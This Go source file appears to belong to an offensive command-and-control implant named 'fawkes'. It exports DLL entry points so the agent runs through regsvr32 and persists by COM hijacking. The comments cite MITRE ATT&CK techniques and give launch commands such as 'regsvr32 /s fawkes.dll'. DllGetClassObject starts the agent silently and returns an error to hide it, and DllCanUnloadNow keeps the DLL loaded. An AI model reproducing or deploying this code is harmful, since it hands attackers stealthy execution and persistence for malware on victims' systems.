//go:build shared && dllexports
// +build shared,dllexports

package main

import "C"
import (
	"sync"
	"unsafe"
)

// agentStartOnce ensures runAgent is only started once when triggered by COM.
// DllGetClassObject may be called multiple times by different COM clients;
// this prevents spawning duplicate agent instances.
var agentStartOnce sync.Once

// startAgentBackground starts the agent in a background goroutine, exactly once.
func startAgentBackground() {
	agentStartOnce.Do(func() {
		go runAgent()
	})
}

// DllRegisterServer is called by regsvr32.exe during DLL registration.
// Enables agent execution via: regsvr32 /s fawkes.dll (MITRE ATT&CK T1218.010)
// This function blocks while the agent runs. Use "start /b regsvr32 /s fawkes.dll"
// for background execution on Windows.
//
//export DllRegisterServer
func DllRegisterServer() int32 {
	runAgent()
	return 0 // S_OK
}

// DllUnregisterServer is called by regsvr32.exe /u during DLL unregistration.
// Provides an alternative regsvr32 execution path: regsvr32 /u /s fawkes.dll
//
//export DllUnregisterServer
func DllUnregisterServer() int32 {
	runAgent()
	return 0 // S_OK
}

// DllCanUnloadNow is called by the COM runtime to check if this DLL can be freed.
// Always returns S_FALSE (1) to keep the DLL loaded while the agent runs in the
// background goroutine started by DllGetClassObject. Supports COM hijack
// persistence (MITRE ATT&CK T1546.015).
//
//export DllCanUnloadNow
func DllCanUnloadNow() int32 {
	return 1 // S_FALSE — do not unload
}

// DllGetClassObject is called when a COM client requests a class factory from this DLL.
// Starts the agent in a background goroutine (via sync.Once) and returns
// CLASS_E_CLASSNOTAVAILABLE so the calling application handles the COM error
// gracefully. Combined with DllCanUnloadNow returning S_FALSE, the DLL remains
// loaded and the agent continues running. Supports COM hijack persistence
// (MITRE ATT&CK T1546.015) — register this DLL as an InprocServer32 for a
// hijacked CLSID.
//
//export DllGetClassObject
func DllGetClassObject(rclsid, riid, ppv unsafe.Pointer) int32 {
	startAgentBackground()
	return -2147221231 // 0x80040111 = CLASS_E_CLASSNOTAVAILABLE
}
